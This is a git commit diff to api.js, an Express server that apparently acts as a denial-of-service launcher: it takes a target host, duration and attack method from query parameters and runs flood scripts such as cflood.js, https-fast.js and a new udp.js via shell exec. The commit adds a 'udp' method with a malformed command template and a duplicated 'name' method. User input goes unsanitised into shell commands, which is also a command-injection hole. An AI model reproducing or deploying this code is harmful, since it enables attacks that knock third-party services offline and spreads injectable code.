783c7f8ddd1a3bafdb543403e62bbafa621c69ce
vinvccfns <vinhmcbotnet999@gmail.com>
2025-11-15 12:24:44 +0700

    Add files via upload

--- api.js
+++ api.js
@@ -2,7 +2,7 @@ const express = require('express');
 const { exec } = require('child_process');
 
 const app = express();
-const PORT = 9922;
+const PORT = 1261;
 
 app.get('/api', (req, res) => {
     const host = req.query.host;
@@ -11,7 +11,7 @@ app.get('/api', (req, res) => {
     const method = req.query.method;
 
     if (!host || !port || !time || !method) {
-        return res.status(400).json({ error: 'Henry API Network 3 method allow [cflood, https-fast, browser]' });
+        return res.status(400).json({ error: 'Henry API Network 3 method allow [cflood, https-fast, browser,udp]' });
     }
 
     let command = '';
@@ -19,9 +19,15 @@ app.get('/api', (req, res) => {
     if (method === 'cflood') {
         command = `screen node cflood.js GET ${host} ${time} 4 90 http.txt --flood`;
     } else if (method === 'https-fast') {
-        command = `screen node https-fast.js GET ${host} ${time} 10 90 https.txt --full`;
+        command = `screen node https-fast.js GET ${host} ${time} 10 90 http.txt --full`;
     } else if (method === 'browser') {
         command = `screen node browser ${host} ${time} 50 50 5009 vn2.txt`;
+        } else if (method === 'udp') {
+        command = `screen node udp.js ${host} $ 80 {time}`;
+    } else if (method === 'name') {
+        command = `screen node name ${host} ${time} 2 2 15 https.txt`;
+    } else if (method === 'name') {
+        command = `screen node name ${host} ${time} 2 2 15 https.txt`;
     } else {
         return res.status(400).json({ error: 'Invalid method.' });
     }
